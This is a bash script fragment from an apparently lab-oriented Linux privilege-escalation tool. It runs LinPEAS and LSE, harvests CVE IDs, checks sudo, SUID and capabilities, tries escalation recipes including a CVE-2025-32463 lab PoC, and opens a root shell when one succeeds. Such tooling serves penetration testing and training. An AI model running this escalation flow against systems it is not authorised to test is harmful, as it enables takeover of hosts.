enum_finished=(0 0)
enum_cleanup_failed=0

enum_group_live() {
  local group=$1 exclude=${2:-0} snapshot
  snapshot=$(ps -e -o pid= -o pgid= -o stat=) || return 2
  awk -v group="$group" -v exclude="$exclude" '
    $2 == group && $1 != exclude && $3 !~ /^Z/ { live=1 }
    END { exit live ? 0 : 1 }' <<< "$snapshot"
}

enum_supervise() {
  local label=$1 group result=0
  shift
  trap - EXIT INT TERM
  trap ':' TERM INT
  set +m
  exec 9<> "$RUN_DIR/.capture/$label.control"
  # The parent verifies this group before authorizing any tool to start.
  IFS= read -r group <&9 || exit 1
  timeout --foreground -k 1 600 "$@" 9>&- &
  local monitor=$!
  while :; do
    wait "$monitor"; result=$?
    kill -0 "$monitor" 2>/dev/null || break
  done
  printf '%s\n' "$result" > "$RUN_DIR/.capture/$label.exit"
  if ((result == 124 || result == 137)); then
    # Enforce timeout cleanup even while the main script is in an open shell.
    kill -TERM -- "-$group" 2>/dev/null || true
    IFS= read -r -t 1 _ <&9 || true
    kill -KILL -- "-$group" 2>/dev/null || true
  fi
  # A builtin read keeps ownership stable without adding a helper process.
  while :; do IFS= read -r _ <&9 || true; done
}

start_enum_capture() {
  local index=$1 label=${enum_labels[$1]} monitor_enabled=0 identity group own_group dependency
  local pending_signal=0
  shift
  for dependency in timeout ps mkfifo awk; do
    if ! command -v "$dependency" >/dev/null 2>&1; then
      printf '[WARN] %s capture unavailable: missing %s.\n' "$label" "$dependency" >&2
      return
    fi
  done
  if ! timeout --foreground -k 1 1 true >/dev/null 2>&1 ||
     ! ps -e -o pid= -o pgid= -o stat= >/dev/null 2>&1; then
    printf '[WARN] %s capture unavailable: unsupported timeout or ps options.\n' "$label" >&2
    return
  fi
  if ! mkfifo "$RUN_DIR/.capture/$label.control"; then
    printf '[WARN] %s capture unavailable: cannot create control FIFO.\n' "$label" >&2
    return
  fi
  [[ $- == *m* ]] && monitor_enabled=1
  set -m
  # Defer cancellation across fork/PID publication so EXIT always owns the child.
  trap 'pending_signal=130' INT
  trap 'pending_signal=143' TERM
  enum_supervise "$label" "$@" > "$RUN_DIR/.capture/$label-output.txt" 2>&1 &
  enum_pids[index]=$!
  trap 'exit 130' INT
  trap 'exit 143' TERM
  ((pending_signal == 0)) || exit "$pending_signal"
  ((monitor_enabled)) || set +m
  identity=$(ps -p "${enum_pids[$index]}" -o pgid= -o lstart=)
  read -r group _ <<< "$identity"
  own_group=$(ps -p "$$" -o pgid= | tr -d ' ')
  if [[ $group != "${enum_pids[$index]}" || $group == "$own_group" || -z $own_group ]]; then
    # No tool has been authorized yet; only the waiting supervisor exists.
    kill -KILL "${enum_pids[$index]}" 2>/dev/null || true
    wait "${enum_pids[$index]}" 2>/dev/null || true
    enum_finished[index]=1
    enum_statuses[index]=cleanup-failed
    enum_cleanup_failed=1
    printf '[WARN] %s process-group isolation failed; capture withheld.\n' "$label" >&2
    return
  fi
  enum_identities[index]=$identity
  enum_statuses[index]=partial
  # From this point cleanup can use the verified group, including before release.
  enum_authorized[index]=1
  printf '%s\n' "$group" > "$RUN_DIR/.capture/$label.control"
}

complete_enum_capture() {
  local index=$1 stopped=${2:-0} group=${enum_pids[$1]} label=${enum_labels[$1]}
  local state identity count result=1
  [[ -n $group && ${enum_finished[$index]} == 0 ]] || return 0
  if [[ ${enum_authorized[$index]} == 0 ]]; then
    # The direct child is blocked on its FIFO and cannot have launched a tool.
    # Its group identity may not have been published when cancellation arrived.
    kill -KILL "$group" 2>/dev/null || true
    for ((count=0; count<10; count++)); do
      kill -0 "$group" 2>/dev/null || break
      sleep 0.1
    done
    if ! kill -0 "$group" 2>/dev/null; then
      wait "$group" 2>/dev/null || true
      enum_finished[index]=1
      enum_statuses[index]=partial
      return 0
    fi
    enum_statuses[index]=cleanup-failed
    enum_cleanup_failed=1
    printf '[WARN] %s unapproved supervisor did not exit; capture withheld.\n' "$label" >&2
    return 1
  fi
  # A stop request must not downgrade a collector that already finished.
  [[ -f $RUN_DIR/.capture/$label.exit ]] && stopped=0
  identity=$(ps -p "$group" -o pgid= -o lstart=)
  if [[ -n $identity && $identity == "${enum_identities[$index]}" ]]; then
    # A completed root with surviving descendants is still a partial run.
    if enum_group_live "$group" "$group"; then stopped=1; fi
    kill -TERM -- "-$group" 2>/dev/null || true
    for ((count=0; count<5; count++)); do
      enum_group_live "$group" "$group"; state=$?
      ((state == 0)) || break
      sleep 0.1
    done
    kill -KILL -- "-$group" 2>/dev/null || true
    for ((count=0; count<10; count++)); do
      enum_group_live "$group"; state=$?
      ((state == 0)) || break
      sleep 0.1
    done
  else
    # A timeout may already have killed its supervisor and the whole group.
    enum_group_live "$group"; state=$?
  fi
  if ((state != 1)); then
    if ! kill -0 "$group" 2>/dev/null; then wait "$group" 2>/dev/null || true; fi
    enum_statuses[index]=cleanup-failed
    enum_cleanup_failed=1
    printf '[WARN] %s cleanup could not be confirmed; capture withheld.\n' "$label" >&2
    return 1
  fi
  wait "$group" 2>/dev/null || true
  enum_finished[index]=1
  if [[ -f $RUN_DIR/.capture/$label.exit ]]; then
    IFS= read -r result < "$RUN_DIR/.capture/$label.exit"
  fi
  if [[ $result == 0 && $stopped == 0 ]]; then enum_statuses[index]=checked; fi
  return 0
}

cleanup_enum_captures() {
  local index
  for index in 0 1; do complete_enum_capture "$index" 1 || true; done
}
trap cleanup_enum_captures EXIT
trap 'exit 130' INT
trap 'exit 143' TERM

if ((have_linpeas)); then
  printf '[ENUM] LinPEAS\n'
  start_enum_capture 0 bash "$linpeas"
fi
if ((have_lse)); then
  printf '[ENUM] LSE\n'
  start_enum_capture 1 bash "$lse" -i -l2 -c
fi

# Only new bytes are screened. A 64-byte overlap catches a CVE split across
# writes without rereading a potentially large PEAS capture on every poll.
cve_tmp="$RUN_DIR/.capture/cve-candidates.txt"
: > "$cve_tmp"
linpeas_offset=0; lse_offset=0; last_cve_count=0
screen_live_output() {
  local label file offset size start delta count
  for label in linpeas lse; do
    file="$RUN_DIR/.capture/$label-output.txt"
    [[ -f $file ]] || continue
    if [[ $label == linpeas ]]; then offset=$linpeas_offset; else offset=$lse_offset; fi
    size=$(wc -c < "$file" | tr -d ' ')
    ((size > offset)) || continue
    start=$((offset > 64 ? offset - 63 : 1))
    delta="$RUN_DIR/.capture/$label.delta"
    tail -c +"$start" "$file" > "$delta"
    if ((VERBOSE)); then tail -c +$((offset-start+2)) "$delta"; fi
    grep -aoE 'CVE-[0-9]{4}-[0-9]{4,}' "$delta" >> "$cve_tmp" || true
    if [[ $label == linpeas ]]; then linpeas_offset=$size; else lse_offset=$size; fi
  done
  count=$(sort -u "$cve_tmp" | wc -l | tr -d ' ')
  if ((count > last_cve_count)); then
    record_finding cve-candidates "$count suggested so far; review package/build status"
    last_cve_count=$count
  fi
}

printf '[ENUM] Verifying local escalation paths.\n'
if command -v sudo >/dev/null 2>&1; then
  # shellcheck disable=SC2024 # The current user owns this capture file.
  sudo -n -l > "$RUN_DIR/.capture/sudo-list.txt" 2>&1 || true
fi
if command -v getcap >/dev/null 2>&1; then
  getcap -r /usr/bin /bin 2>/dev/null > "$RUN_DIR/.capture/capabilities.txt" || true
fi
find /usr/bin /bin -maxdepth 1 -perm -4000 -type f 2>/dev/null > "$RUN_DIR/.capture/suid-files.txt" || true

selected=''
shell_opened=0
candidates=(already-root sudo-shell suid-bash suid-find python-cap-setuid docker-host-root)
if ((LAB_CVE_ENABLED)); then candidates+=(cve-2025-32463-lab); fi
for candidate in "${candidates[@]}"; do
  if verify_recipe "$candidate"; then
    selected=$candidate
    record_finding local-escalation "$candidate independently verified"
    record_attempt "$candidate" proof-success
    break
  fi
  record_attempt "$candidate" prerequisite-not-met
done
if [[ -n $selected && $NO_SHELL == 0 ]]; then
  if ((FINISH_BG_ENUM)); then
    printf '[ENUM] Enumerators continue while the shell is open. Final files are saved when it exits.\n'
    early_evidence=verified-local-proof
    if [[ $selected == cve-2025-32463-lab ]]; then
      early_evidence="uid0-probe,sudo-sha256:$CVE_SUDO_SHA,poc-sha256:$CVE_POC_SHA"
    fi
    printf '%s\t%s\t%s\n' "$host_name" "$selected" "$early_evidence" > "$RUN_DIR/success.tsv"
    open_shell "$selected"
    shell_opened=1
  else
    cleanup_enum_captures
    printf '[ENUM] Stopping remaining enumerators after verified proof.\n'
  fi
fi

while :; do
  screen_live_output
  active=0
  for index in 0 1; do
    [[ -n ${enum_pids[$index]} && ${enum_finished[$index]} == 0 && ${enum_statuses[$index]} != cleanup-failed ]] || continue
    label=${enum_labels[$index]}
    if [[ -f $RUN_DIR/.capture/$label.exit ]] || ! kill -0 "${enum_pids[$index]}" 2>/dev/null; then
      complete_enum_capture "$index" || true
    else
      active=1
    fi
  done
  ((active)) || break
  sleep 0.2
done
screen_live_output
[[ ${enum_statuses[0]} == checked ]] && linpeas_complete=1
[[ ${enum_statuses[1]} == checked ]] && lse_complete=1
for index in 0 1; do
  printf '%s\t%s\n' "${enum_labels[$index]}" "${enum_statuses[$index]}" >> "$RUN_DIR/coverage.tsv"
done
for label in linpeas lse; do
  output="$RUN_DIR/.capture/$label-output.txt"
  if [[ -f $output ]]; then
    count=$(grep -aEic 'writ(e|able)|password|credential|suid|cap_setuid|sudo|CVE-' "$output" || true)
    record_finding "$label-screening" "$count candidate lines in raw output; values withheld from console"
  fi
done
sort -u "$cve_tmp" -o "$cve_tmp"
if [[ $selected == cve-2025-32463-lab ]]; then
  printf 'CVE-2025-32463 tested lab build\tchecked\texact sudo and PoC digests plus UID 0 probe\n' >> "$RUN_DIR/coverage.tsv"
elif (( ! LAB_CVE_ENABLED )); then
  printf 'CVE-2025-32463 tested lab build\tunsupported\texplicit lab opt-in not supplied\n' >> "$RUN_DIR/coverage.tsv"
else
  printf 'CVE-2025-32463 tested lab build\tinapplicable\texact reviewed build not detected\n' >> "$RUN_DIR/coverage.tsv"
fi
enum_status=unsupported
if ((linpeas_complete && lse_complete)); then enum_status=checked; fi
while IFS='|' read -r area basis; do
  [[ -n $area ]] && printf '%s\t%s\t%s\n' "$area" "$enum_status" "$basis" >> "$RUN_DIR/coverage.tsv"
done <<'EOF'
Situational Awareness and Initial Enumeration|enumerator output
Check OS version, hostname, IP and distribution.|enumerator output
User and Sudoers Enumeration|enumerator output plus native sudo check
Startup scripts|enumerator output
History and backups|enumerator output
Sudoers|enumerator output plus native sudo check
Installed Applications|enumerator output
Drive Configuration|enumerator output
Service Enum|enumerator output
Docker / LXC Enum|enumerator output; Docker proof recorded separately
Running Processes|enumerator output
Network & WiFi Enumeration|local host output only
Cronjobs & Scheduled Tasks|enumerator output; no task change
Common Privilege Escalation Methods|enumerator output; named recipes recorded separately
SUID / SGID binaries|enumerator output; native bash and find proofs recorded separately
Writable files & directories|enumerator output; no file change
Passwords & sensitive files|enumerator output; values only in protected raw files
Interesting Files|enumerator output
Databases|passive enumeration only; no authentication
MYSQL / MariaDB|passive enumeration only; no authentication
POSTGRESQL|passive enumeration only; no authentication
SQLite / SQLite3|passive enumeration only; no authentication
Redis (redis-cli)|passive enumeration only; no authentication
MongoDB|passive enumeration only; no authentication
Automated Privilege Escalation Tools|LinPEAS and LSE
EOF
if [[ $selected == docker-host-root ]]; then
  printf 'Docker Escape\tchecked\tread-only host bind probe returned UID 0\n' >> "$RUN_DIR/coverage.tsv"
else
  printf 'Docker Escape\tunsupported\tno independent Docker escape proof in this run\n' >> "$RUN_DIR/coverage.tsv"
fi
printf 'Kernel & exploit checks\tunsupported\tCVE text is a review lead, not build or patch proof\nEnvironment abuse\tunsupported\tno independent privilege proof\nPath abuse\tunsupported\tno independent privilege proof\n' >> "$RUN_DIR/coverage.tsv"
# shellcheck disable=SC1112 # Preserve the checklist heading verbatim.
printf 'Dump clear PSK keys from the Network Manager if available.\tunsupported\tno cleartext value extraction\nCheck for tasks that are run as root and are world writeable.\tunsupported\timpactful change needs a reviewed recipe\nRev Shell’s\tinapplicable\ttool opens a local shell\nRed Teaming Toolkit\tunsupported\ttool-specific checklist entry\nBeRoot\tunsupported\ttool-specific checklist entry\n' >> "$RUN_DIR/coverage.tsv"
printf 'CVE build and patch applicability\tunsupported\toffline index is a review lead, not a vulnerable-build test\n' >> "$RUN_DIR/coverage.tsv"

# The visible alerts above precede these final output filenames.
for index in 0 1; do
  label=${enum_labels[$index]}
  if [[ ${enum_statuses[$index]} != cleanup-failed && ${enum_finished[$index]} == 1 && -f $RUN_DIR/.capture/$label-output.txt ]]; then
    mv "$RUN_DIR/.capture/$label-output.txt" "$RUN_DIR/$label-output.txt"
    printf '[SAVED] %s-output.txt\n' "$label"
  fi
done
while IFS= read -r cve; do
  [[ -n $cve ]] && printf '%s\thttps://www.cve.org/CVERecord?id=%s\n' "$cve" "$cve"
done < "$cve_tmp" > "$RUN_DIR/cve-candidates.tsv"
printf 'cve\tstatus\tplatform\tproduct\tkev_date\treference\n' > "$RUN_DIR/cve-index.tsv"
if [[ $CVE_BASE == /dev/null && $CVE_CURATED == /dev/null && ! -d $CATALOG_DIR/cve-ids ]]; then
  printf '[WARN] Offline CVE catalog unavailable; retaining CVE.org links.\n' >&2
fi
while IFS= read -r cve; do
  [[ -n $cve ]] && cve_lookup "$cve" linux >> "$RUN_DIR/cve-index.tsv"
done < "$cve_tmp"
printf 'cve\tstate\tdescription\taffected_json\treferences_json\treview_state\tsource_json\n' > "$RUN_DIR/cve-details.tsv"
if ! cve_details_batch < "$cve_tmp" >> "$RUN_DIR/cve-details.tsv"; then
  printf '[WARN] Offline CVE details failed integrity checks; withholding affected details.\n' >&2
fi
printf '[SAVED] findings.tsv, coverage.tsv, attempts.tsv, tools.tsv\n'

if [[ -n $selected ]]; then
  evidence='verified-local-proof'
  if [[ $selected == cve-2025-32463-lab ]]; then
    evidence="uid0-probe,sudo-sha256:$CVE_SUDO_SHA,poc-sha256:$CVE_POC_SHA"
  fi
  printf '%s\t%s\t%s\n' "$host_name" "$selected" "$evidence" > "$RUN_DIR/success.tsv"
  if (( ! shell_opened )); then open_shell "$selected"; fi
  ((enum_cleanup_failed)) && exit 1
  exit 0
fi
printf '[RESULT] No supported local escalation recipe verified. See %s\n' "$RUN_DIR"
exit "$enum_cleanup_failed"
